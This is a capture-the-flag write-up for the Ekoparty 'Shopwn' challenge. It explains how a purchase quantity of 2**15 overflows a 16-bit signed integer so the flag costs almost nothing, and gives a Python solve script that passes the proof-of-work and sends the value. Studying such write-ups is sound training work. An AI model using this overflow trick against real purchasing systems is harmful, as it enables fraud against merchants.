# Shopwn (Pwn, 375p, 76 solved)

A task very similar to Shopping, but this time we can pass only positive numbers as quantity.
The interface is exactly the same so again:

```
Welcome to Ekoparty shopping Center
Feel free to buy up to 5 items that you may like
Use wisely your coins, have fun!


You have 50 coins
What do you wanna buy today?
1. t-shirt		10
2. short		20
3. stickers		1
4. flag			?
```

This time the trick is to guess that since the server can check if our input is negative, it means there is a signed integer of some sort where our input is stored.
In such case there is a chance of causing integer overflow when this value is multiplied by the price.
We didn't know how many bits they're using but we got a hit with 16 bits.
So we send a large signed 16 bit integer, which has to overflow after multiplication.

We run:

```python
import hashlib
import re

import os

from crypto_commons.netcat.netcat_commons import nc, send, interactive


def PoW(task):
    while True:
        data = os.urandom(10)
        if hashlib.sha1(data).hexdigest()[0:6] == task:
            return data


def main():
    url = "shopping.ctf.site"
    port = 22222
    s = nc(url, port)
    data = s.recv(9999)
    task = re.findall("== (.*)", data)[0]
    send(s, PoW(task))
    print(s.recv(9999))
    send(s, "4")
    print(s.recv(9999))
    send(s, str(2 ** 15))
    print(s.recv(9999))
    interactive(s)


main()

```

and we get `EKO{dude_where_is_my_leak?}`
